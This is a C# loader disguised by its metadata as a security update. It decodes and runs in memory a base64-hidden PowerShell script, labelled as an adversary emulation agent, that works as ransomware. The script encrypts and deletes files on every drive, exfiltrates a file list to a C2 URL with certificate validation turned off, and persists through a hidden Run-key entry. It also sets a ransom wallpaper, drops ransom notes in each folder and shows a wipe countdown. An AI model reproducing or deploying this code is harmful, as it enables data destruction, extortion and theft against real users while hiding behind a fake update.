using System.Reflection;
using System;
using System.Management.Automation; // Requires System.Management.Automation.dll
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;

[assembly: AssemblyTitle("Apex Pro System Host")]
[assembly: AssemblyDescription("Critical System Health and Security Update")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Apex Security Solutions")]
[assembly: AssemblyProduct("Apex Framework")]
[assembly: AssemblyCopyright("Copyright Â© 2026")]
[assembly: AssemblyVersion("1.0.4.2")]
[assembly: AssemblyFileVersion("1.0.4.2")]

namespace ApexPro
{
    class Program
    {
        static void Main(string[] args)
        {
            // 1. YOUR POWERSHELL CODE (B64 Encoded to prevent static analysis)
            // You would take your ApexSim.ps1 and convert it to a Base64 string
            string encodedScript = "PCMKLlNZTk9QU0lTCiAgICBBcGV4IFBybyBBZHZlcnNhcnkgRW11bGF0aW9uIEFnZW50LgouREVTQ1JJUFRJT04KICAgIENvbXByZWhlbnNpdmUgc2NyaXB0IHRvIHNpbXVsYXRlIHJhbnNvbXdhcmUgYmVoYXZpb3I6IFBlcnNpc3RlbmNlLCAKICAgIE5ldHdvcmsgU2hhcmUgRGlzY292ZXJ5LCBIVFRQUyBFeGZpbHRyYXRpb24sIGFuZCBmb3JjZWQgV2FsbHBhcGVyIGNoYW5nZS4KIz4KCnBhcmFtKAogICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXQogICAgW1ZhbGlkYXRlU2V0KCJFbmNyeXB0IiwgIkRlY3J5cHQiKV0KICAgICRNb2RlLCAKCiAgICBbc3RyaW5nXSRUYXJnZXRQYXRoID0gIkM6XFNpbXVsYXRpb25EYXRhIiwgCgogICAgW3N0cmluZ10kQzJVcmwgPSAiaHR0cHM6Ly9ZT1VSX0MyX0lQL2FwaS92MS90ZWxlbWV0cnkiLAoKICAgIFtpbnRdJFRpbWVyID0gNjAKKQoKIyBHbG9iYWwgU1NMIEJ5cGFzcyBmb3IgQWQtSG9jL1NlbGYtU2lnbmVkIENlcnRpZmljYXRlcwpbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9CgojIFNoYXJlZCBBRVMtMjU2IEtleSAoMzIgYnl0ZXMpCiRQYXNzcGhyYXNlID0gIjEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyIgokS2V5Qnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRQYXNzcGhyYXNlKQoKIyAtLS0gU0VDVElPTiAxOiBXQUxMUEFQRVIgSElKQUNLIChUMTQ5MSkgLS0tCiRXUF9Db2RlID0gQCcKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnB1YmxpYyBjbGFzcyBXYWxscGFwZXIgewogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFN5c3RlbVBhcmFtZXRlcnNJbmZvKGludCB1QWN0aW9uLCBpbnQgdVBhcmFtLCBzdHJpbmcgbHB2UGFyYW0sIGludCBmdVdpbkluaSk7CiAgICBwdWJsaWMgY29uc3QgaW50IFNQSV9TRVRERVNLV0FMTFBBUEVSID0gMHgwMDE0OwogICAgcHVibGljIGNvbnN0IGludCBTUElGX1VQREFURUlOSUZJTEUgPSAweDAxOwogICAgcHVibGljIGNvbnN0IGludCBTUElGX1NFTkRXSU5JTklDSEFOR0UgPSAweDAyOwogICAgcHVibGljIHN0YXRpYyB2b2lkIFNldChzdHJpbmcgcGF0aCkgewogICAgICAgIFN5c3RlbVBhcmFtZXRlcnNJbmZvKFNQSV9TRVRERVNLV0FMTFBBUEVSLCAwLCBwYXRoLCBTUElGX1VQREFURUlOSUZJTEUgfCBTUElGX1NFTkRXSU5JTklDSEFOR0UpOwogICAgfQp9CidACkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkV1BfQ29kZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQoKZnVuY3Rpb24gU2V0LUFwZXhXYWxscGFwZXIgewogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZwogICAgJFBhdGggPSAiJGVudjpURU1QXGFwZXhfYmcuYm1wIgogICAgJEJtcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwKDE5MjAsMTA4MCkKICAgICRHID0gW1N5c3RlbS5EcmF3aW5nLkdyYXBoaWNzXTo6RnJvbUltYWdlKCRCbXApCiAgICAkRy5DbGVhcihbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpEYXJrUmVkKQogICAgJEZvbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkZvbnQoIkltcGFjdCIsIDgwKQogICAgJEcuRHJhd1N0cmluZygiU1lTVEVNIEVOQ1JZUFRFRCIsICRGb250LCBbU3lzdGVtLkRyYXdpbmcuQnJ1c2hlc106OldoaXRlLCA0MDAsIDQwMCkKICAgICRHLkRyYXdTdHJpbmcoIkNvbnRhY3QgQWRtaW4gdG8gUmVjb3ZlciIsIChOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkZvbnQoIkFyaWFsIiwgNDApKSwgW1N5c3RlbS5EcmF3aW5nLkJydXNoZXNdOjpXaGl0ZSwgNTUwLCA1NTApCiAgICAkQm1wLlNhdmUoJFBhdGgsIFtTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0XTo6Qm1wKQogICAgJEcuRGlzcG9zZSgpOyAkQm1wLkRpc3Bvc2UoKQogICAgW1dhbGxwYXBlcl06OlNldCgkUGF0aCkKfQoKIyAtLS0gU0VDVElPTiAyOiBDUllQVE8gRU5HSU5FIChUMTQ4NikgLS0tCmZ1bmN0aW9uIEludm9rZS1BcGV4Q2lwaGVyIHsKICAgIHBhcmFtICgkUGF0aCwgJEtleSwgJEFjdGlvbikKICAgIHRyeSB7CiAgICAgICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCiAgICAgICAgJEFlcy5LZXkgPSAkS2V5CiAgICAgICAgaWYgKCRBY3Rpb24gLWVxICJFbmNyeXB0IikgewogICAgICAgICAgICAkQWVzLkdlbmVyYXRlSVYoKQogICAgICAgICAgICAkRW5jID0gJEFlcy5DcmVhdGVFbmNyeXB0b3IoKQogICAgICAgICAgICAkSW4gPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAgICAgICAgICRPdXQgPSAkRW5jLlRyYW5zZm9ybUZpbmFsQmxvY2soJEluLCAwLCAkSW4uTGVuZ3RoKQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCIkUGF0aC5sb2NrZWQiLCAoJEFlcy5JViArICRPdXQpKQogICAgICAgICAgICBSZW1vdmUtSXRlbSAkUGF0aCAtRm9yY2UKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkSW4gPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAgICAgICAgICRBZXMuSVYgPSAkSW5bMC4uMTVdCiAgICAgICAgICAgICRDaXBoZXIgPSAkSW5bMTYuLigkSW4uTGVuZ3RoLTEpXQogICAgICAgICAgICAkRGVjID0gJEFlcy5DcmVhdGVEZWNyeXB0b3IoKQogICAgICAgICAgICAkUGxhaW4gPSAkRGVjLlRyYW5zZm9ybUZpbmFsQmxvY2soJENpcGhlciwgMCwgJENpcGhlci5MZW5ndGgpCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJFBhdGguUmVwbGFjZSgiLmxvY2tlZCIsIiIpLCAkUGxhaW4pCiAgICAgICAgICAgIFJlbW92ZS1JdGVtICRQYXRoIC1Gb3JjZQogICAgICAgIH0KICAgIH0gY2F0Y2ggeyBXcml0ZS1XYXJuaW5nICJBY2Nlc3MgRGVuaWVkOiAkUGF0aCIgfQp9CgojIC0tLSBTRUNUSU9OIDM6IEMyIEVYRklMVFJBVElPTiAoVDEwNDEpIC0tLQpmdW5jdGlvbiBTZW5kLUFwZXhFeGZpbCB7CiAgICBwYXJhbSAoJERhdGFNYW5pZmVzdCkKICAgICRKc29uID0gJERhdGFNYW5pZmVzdCB8IENvbnZlcnRUby1Kc29uCiAgICAkQWVzID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkKICAgICRBZXMuS2V5ID0gJEtleUJ5dGVzCiAgICAkQWVzLkdlbmVyYXRlSVYoKQogICAgJEVuYyA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKICAgICRQYXlsb2FkID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkSnNvbikKICAgICRDaXBoZXIgPSAkRW5jLlRyYW5zZm9ybUZpbmFsQmxvY2soJFBheWxvYWQsIDAsICRQYXlsb2FkLkxlbmd0aCkKICAgICRCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRBZXMuSVYgKyAkQ2lwaGVyKQogICAgCiAgICB0cnkgewogICAgICAgICRSZXNwb25zZSA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJEMyVXJsIC1NZXRob2QgUG9zdCAtQm9keSAoQHtwYXlsb2FkPSRCNjR9fENvbnZlcnRUby1Kc29uKSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgV3JpdGUtSG9zdCAiWytdIFNVQ0NFU1M6IFNlcnZlciByZXNwb25kZWQgd2l0aCAkKCRSZXNwb25zZS5zdGF0dXMpIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICB9IGNhdGNoIHsKICAgICAgICBXcml0ZS1Ib3N0ICJbISEhXSBFWEZJTCBFUlJPUjogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICB9Cn0KCiMgLS0tIFNFQ1RJT04gNDogTUFJTiBFWEVDVVRJT04gLS0tCmlmICgkTW9kZSAtZXEgIkVuY3J5cHQiKSB7CiAgICBXcml0ZS1Ib3N0ICJbIV0gSU5JVElBVElORyBJTVBBQ1QgUEhBU0UuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkCiAgICAKICAgIFNldC1BcGV4V2FsbHBhcGVyCgogICAgIyAtLS0gU01BUlQgUEVSU0lTVEVOQ0UgKFQxNTQ3LjAwMSkgLS0tCiAgICAkQ3VycmVudFBhdGggPSAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5QYXRoCiAgICBpZiAoJEN1cnJlbnRQYXRoIC1saWtlICIqLmV4ZSIpIHsKICAgICAgICAkUnVuVmFsdWUgPSAiYCIkQ3VycmVudFBhdGhgIiIKICAgIH0gZWxzZSB7CiAgICAgICAgJFJ1blZhbHVlID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUZpbGUgYCIkUFNDb21tYW5kUGF0aGAiIC1Nb2RlIEVuY3J5cHQiCiAgICB9CgogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiBgCiAgICAgICAgICAgICAgICAgICAgIC1OYW1lICJBcGV4VXBkYXRlIiAtVmFsdWUgJFJ1blZhbHVlIC1Gb3JjZSB8IE91dC1OdWxsCgogICAgIyAtLS0gRElTQ09WRVJZICYgSU1QQUNUIC0tLQogICAgJFRhcmdldHMgPSBAKCRUYXJnZXRQYXRoKQogICAgJFRhcmdldHMgKz0gR2V0LVBTRHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSB8IFdoZXJlLU9iamVjdCB7ICRfLkRpc3BsYXlSb290IH0gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBSb290CgogICAgZm9yZWFjaCAoJFQgaW4gJFRhcmdldHMpIHsKICAgICAgICBpZiAoVGVzdC1QYXRoICRUKSB7CiAgICAgICAgICAgICRGaWxlcyA9IEdldC1DaGlsZEl0ZW0gJFQgLVJlY3Vyc2UgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyRfLkV4dGVuc2lvbiAtbmUgIi5sb2NrZWQiIC1hbmQgJF8uTmFtZSAtbm90bGlrZSAiKlJFQ09WRVIqIn0KICAgICAgICAgICAgU2VuZC1BcGV4RXhmaWwgLURhdGFNYW5pZmVzdCAoJEZpbGVzIHwgU2VsZWN0LU9iamVjdCBOYW1lLCBMZW5ndGgpCiAgICAgICAgICAgIGZvcmVhY2ggKCRGIGluICRGaWxlcykgeyBJbnZva2UtQXBleENpcGhlciAtUGF0aCAkRi5GdWxsTmFtZSAtS2V5ICRLZXlCeXRlcyAtQWN0aW9uICJFbmNyeXB0IiB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkRGlycyA9IEdldC1DaGlsZEl0ZW0gJFQgLVJlY3Vyc2UgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgJERpcnMgKz0gR2V0LUl0ZW0gJFQKICAgICAgICAgICAgZm9yZWFjaCAoJEQgaW4gJERpcnMpIHsgCiAgICAgICAgICAgICAgICAiPGh0bWw+PGJvZHkgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6YmxhY2s7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyc+PGgxPiEhISBDT05UQUNUIEFETUlOIFRPIFJFQ09WRVIgREFUQSAhISE8L2gxPjwvYm9keT48L2h0bWw+IiB8IE91dC1GaWxlIChKb2luLVBhdGggJEQuRnVsbE5hbWUgIlJFQ09WRVJfRklMRVNfTk9XLmh0bWwiKSAtRm9yY2UgCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgJEVuZCA9IChHZXQtRGF0ZSkuQWRkU2Vjb25kcygkVGltZXIpCiAgICB3aGlsZSAoKEdldC1EYXRlKSAtbHQgJEVuZCkgewogICAgICAgIFdyaXRlLUhvc3QgImByWyFdIERBVEEgV0lQRSBJTjogJCgoJEVuZCAtIChHZXQtRGF0ZSkpLlRvU3RyaW5nKCdtbVw6c3MnKSkiIC1Ob05ld2xpbmUgLUZvcmVncm91bmRDb2xvciBSZWQKICAgICAgICBTdGFydC1TbGVlcCAxCiAgICB9Cn0gCmVsc2UgewogICAgV3JpdGUtSG9zdCAiWypdIElOSVRJQVRJTkcgUkVDT1ZFUlkgUEhBU0UuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KICAgIEdldC1DaGlsZEl0ZW0gJFRhcmdldFBhdGggLVJlY3Vyc2UgLUZpbHRlciAiKi5sb2NrZWQiIHwgRm9yRWFjaC1PYmplY3QgeyBJbnZva2UtQXBleENpcGhlciAtUGF0aCAkXy5GdWxsTmFtZSAtS2V5ICRLZXlCeXRlcyAtQWN0aW9uICJEZWNyeXB0IiB9CiAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC1OYW1lICJBcGV4VXBkYXRlIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQp9";
            byte[] data = Convert.FromBase64String(encodedScript);
            string decodedScript = Encoding.UTF8.GetString(data);

            // 2. CREATE A RUNSPACE
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            
            // 3. EXECUTE THE SCRIPT IN MEMORY
            ps.AddScript(decodedScript);
            
            // Pass arguments if needed (Mode, TargetPath, etc)
            ps.AddParameter("Mode", "Encrypt");
            ps.AddParameter("C2Url", "https://192.168.56.1/api/v1/telemetry");

            ps.Invoke();
            
            Console.WriteLine("[+] Update Complete.");
            rs.Close();
        }
    }
}